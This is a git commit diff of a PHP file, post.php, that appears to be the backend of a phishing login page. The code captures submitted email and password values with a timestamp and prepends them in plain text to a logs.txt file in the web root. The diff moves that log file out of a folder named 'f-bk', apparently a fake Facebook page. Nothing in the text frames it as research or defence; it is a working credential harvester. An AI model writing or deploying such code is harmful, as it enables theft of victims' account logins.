96c5b22ebcf8385973aa89b53c7dabe39dee16ba
Christian De Leon <christian.deleon.mgx@gmail.com>
2022-01-03 01:16:52 +0800

    first commit

--- post.php
+++ post.php
@@ -5,8 +5,8 @@ date_default_timezone_set("Asia/Manila");
 if(isset($_POST['email'])){
 	$timestamp = date("Y-m-d H:i:s");
 	$content = $_POST['email']." | ".$_POST['password']." | ".$timestamp." => \n\r";
-	echo "<h1>".$_SERVER['DOCUMENT_ROOT']."</h1>";
-	$file_path = $_SERVER['DOCUMENT_ROOT'] . "/f-bk/logs.txt";
+	// echo "<h1>".$_SERVER['DOCUMENT_ROOT']."</h1>";
+	$file_path = $_SERVER['DOCUMENT_ROOT'] . "/logs.txt";
 	$file_content = file_get_contents($file_path)."\n";
 	$fp = fopen($file_path,"wb");
 	fwrite($fp,$content.$file_content);
